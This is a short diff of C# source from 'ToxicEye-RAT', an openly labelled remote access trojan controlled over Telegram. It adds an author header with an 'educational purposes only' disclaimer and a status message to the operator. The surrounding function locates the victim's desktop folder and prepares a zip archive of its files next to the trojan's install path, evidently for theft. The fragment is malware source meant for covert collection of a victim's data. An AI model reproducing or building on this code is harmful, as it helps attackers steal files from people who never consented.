@@ -1,4 +1,12 @@
-﻿using System;
+﻿/* 
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https://github.com/LimerBoy
+
+       > This program is distributed for educational purposes only.
+*/
+
+using System;
 using System.Linq;
 using System.IO;
 using System.IO.Compression;
@@ -9,6 +17,8 @@ namespace TelegramRAT
     {
         public static void get()
         {
+            // Info
+            telegram.sendText("📦 Archiving desktop files...");
             // Find files on desktop
             string archivePath = Path.GetDirectoryName(config.InstallPath) + "\\desktop.zip";
             string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
